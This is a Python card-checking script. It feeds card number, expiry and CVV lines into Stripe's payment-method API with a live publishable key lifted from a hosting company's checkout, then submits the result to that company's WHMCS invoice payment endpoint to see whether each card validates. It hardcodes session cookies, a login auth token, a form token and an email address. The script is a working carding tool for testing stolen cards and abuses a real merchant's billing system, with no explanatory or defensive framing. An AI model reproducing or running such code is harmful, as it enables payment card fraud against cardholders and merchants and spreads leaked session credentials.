import requests,re,random,time,string,base64
from bs4 import BeautifulSoup

def Tele(cx):
    cc = cx.split("|")[0]
    bin=cc[:6]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]
    if "20" in ano:
        ano = ano.split("20")[1]
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=65de90e3-1f2c-46c4-80a3-58d1ef9e849bb4a4c5&muid=cb4deb5a-78c3-490e-b5df-f18248ec8b8e6d4138&sid=0318096e-5202-46b0-9951-deb294e7e45ff55485&pasted_fields=number&payment_user_agent=stripe.js%2Faa94cb39d1%3B+stripe-js-v3%2Faa94cb39d1%3B+split-card-element&referrer=https%3A%2F%2Fcontrol.king-servers.com&time_on_page=1053667&key=pk_live_51IE6fiGBIzJ3Q1SgUnKfVm53GVb5iL3ijwdMk7csvRZ7oYDt0ZOtqVTWcKk1lirPUFMtkauc0Y8dU0cQuw8FZyYX00b3HeHwEv'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
      id=response.json()['id']
      print(id)
    except:
      return '#'
    cookies = {
    'cus': 'joker97e%40gmail.com',
    '__stripe_mid': 'cb4deb5a-78c3-490e-b5df-f18248ec8b8e6d4138',
    '__stripe_sid': '0318096e-5202-46b0-9951-deb294e7e45ff55485',
    'WHMCSy551iLvnhYt7': '9p52rbv8q5993213gh4e5fcqj6',
    'WHMCSlogin_auth_tk': 'bVFLKzNDeHVINVZOb3cyY1hvczRQTUpHbTZhZ0Ywdll2eVRrRUYxRUhadmR2QUhxRk1zeHQ3b2xTaUp1N201YlI5YkRKNzBpWUJ4aFBiZjF5cGZ4aTZyZG90YTBzTE56Nkt1YXg3L2ZTTVBDSTAwN056ckxNdHVmNkhkVUxEaWhHaFQrSzdPSWxHRkprcWJUTmpaV3pwckRnbnl5UGdXMU5lamV4ZUpUSW5BSHFZVGcwYkJvdTgzenZIQ2xvczJYZVZiQzdEWnliOE84cXUvdmtwV3lzc0RqVEFyaXJkR3BpdlBuTXo4dFQxNEMzWlVnQ01wQlZ6ME9mRXNwazRueXBIYlV0MDA4NFUwdE01VkNLeXlEWUtERGdub0JvdFNSaDU5Ym90MHhPSXhTVWRvUGhTRC83ekFMOFZWL1R4WTU0QWxzUGFXa1BsUFQ4R2txRUY4QjE3V1pvclloZHNWNFYrelhqcTRrQktweHAzeXQ1bmwxK29CTTNQalQ2WFVwL3ZkOUMwcldXbkNGZ2F5ZW9RT1IrOW1yNzRZNw%3D%3D',
}

    headers = {
    'authority': 'control.king-servers.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'cus=joker97e%40gmail.com; __stripe_mid=cb4deb5a-78c3-490e-b5df-f18248ec8b8e6d4138; __stripe_sid=0318096e-5202-46b0-9951-deb294e7e45ff55485; WHMCSy551iLvnhYt7=9p52rbv8q5993213gh4e5fcqj6; WHMCSlogin_auth_tk=bVFLKzNDeHVINVZOb3cyY1hvczRQTUpHbTZhZ0Ywdll2eVRrRUYxRUhadmR2QUhxRk1zeHQ3b2xTaUp1N201YlI5YkRKNzBpWUJ4aFBiZjF5cGZ4aTZyZG90YTBzTE56Nkt1YXg3L2ZTTVBDSTAwN056ckxNdHVmNkhkVUxEaWhHaFQrSzdPSWxHRkprcWJUTmpaV3pwckRnbnl5UGdXMU5lamV4ZUpUSW5BSHFZVGcwYkJvdTgzenZIQ2xvczJYZVZiQzdEWnliOE84cXUvdmtwV3lzc0RqVEFyaXJkR3BpdlBuTXo4dFQxNEMzWlVnQ01wQlZ6ME9mRXNwazRueXBIYlV0MDA4NFUwdE01VkNLeXlEWUtERGdub0JvdFNSaDU5Ym90MHhPSXhTVWRvUGhTRC83ekFMOFZWL1R4WTU0QWxzUGFXa1BsUFQ4R2txRUY4QjE3V1pvclloZHNWNFYrelhqcTRrQktweHAzeXQ1bmwxK29CTTNQalQ2WFVwL3ZkOUMwcldXbkNGZ2F5ZW9RT1IrOW1yNzRZNw%3D%3D',
    'origin': 'https://control.king-servers.com',
    'referer': 'https://control.king-servers.com/index.php?rp=/invoice/224537/pay',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'token': '8aba9b27b9201ad4acac607d1891f137476dd878',
    'invoiceid': '224537',
    'ccinfo': 'new',
    'billingcontact': '0',
    'firstname': '',
    'lastname': '',
    'address1': '',
    'address2': '',
    'country': 'US',
    'state': '',
    'city': '',
    'postcode': '',
    'country-calling-code-phonenumber': '1',
    'phonenumber': '',
    'ccdescription': '',
    'payment_method_id': id,
}
    response = requests.post(
    'https://control.king-servers.com/index.php?rp=/stripe/payment/intent',
    cookies=cookies,
    headers=headers,
    data=data,
)
    ii=response.json()['validation_feedback']
    print(ii)
    return ii